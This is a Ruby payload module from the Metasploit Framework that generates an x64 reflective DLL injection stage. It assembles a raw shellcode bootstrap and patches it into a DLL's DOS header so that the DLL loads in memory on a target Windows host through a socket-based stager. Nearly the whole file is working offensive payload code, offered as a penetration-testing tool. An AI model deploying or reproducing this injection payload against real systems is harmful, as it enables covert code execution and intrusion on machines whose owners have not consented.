# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/reflective_dll_loader'

module Msf


###
#
# Common module stub for ARCH_X86_64 payloads that make use of Reflective DLL Injection.
#
###


module Payload::Windows::ReflectiveDllInject_x64

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Reflective DLL Injection',
      'Description'   => 'Inject a DLL via a reflective loader',
      'Author'        => [ 'sf' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86_64,
      'PayloadCompat' =>
        {
          'Convention' => 'sockrdi'
        },
      'Stage'         =>
        {
          'Offsets' =>
            {
              'EXITFUNC' => [ 47, 'V' ]
            },
          'Payload' => ""
        }
      ))

    register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
  end

  def library_path
    datastore['DLL']
  end

  def stage_payload
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(library_path)

    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration

    bootstrap = "\x4D\x5A" +                        # pop r10             ; pop r10 = 'MZ'
          "\x41\x52" +                        # push r10            ; push r10 back
          "\x55" +                            # push rbp            ; save ebp
          "\x48\x89\xE5" +                    # mov rbp, rsp        ; setup fresh stack frame
          "\x48\x81\xEC\x20\x00\x00\x00" +    # sub rsp, 32         ; alloc some space for calls
          "\x48\x8D\x1D\xEA\xFF\xFF\xFF" +    # lea rbx, [rel+0]    ; get virtual address for the start of this stub
          "\x48\x81\xC3" + [offset].pack( "V" ) + # add rbx, 0x???????? ; add offset to ReflectiveLoader
          "\xFF\xD3" +                        # call rbx            ; call ReflectiveLoader()
          "\x48\x89\xC3" +                    # mov rbx, rax        ; save DllMain for second call
          "\x49\x89\xF8" +                    # mov r8, rdi         ; R8 = our socket
          "\x68\x04\x00\x00\x00" +            # push 4              ;
          "\x5A" +                            # pop rdx             ; RDX = signal we have attached
          "\xFF\xD0" +                        # call rax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
          "\x41\xB8" + exit_funk +            # mov r8d, 0x???????? ; our EXITFUNC placeholder
          "\x68\x05\x00\x00\x00" +            # push 5              ;
          "\x5A" +                            # pop rdx             ; signal we have detached
          "\xFF\xD3"                          # call rbx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
          # the DOS headers e_lfanew entry will begin here at offset 64.

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if( bootstrap.length > 62 )
      print_error( "Reflective Dll Injection (x64) generated an oversized bootstrap!" )
      return
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap

    # return our stage to be loaded by the intermediate stager
    return dll
  end

end

end

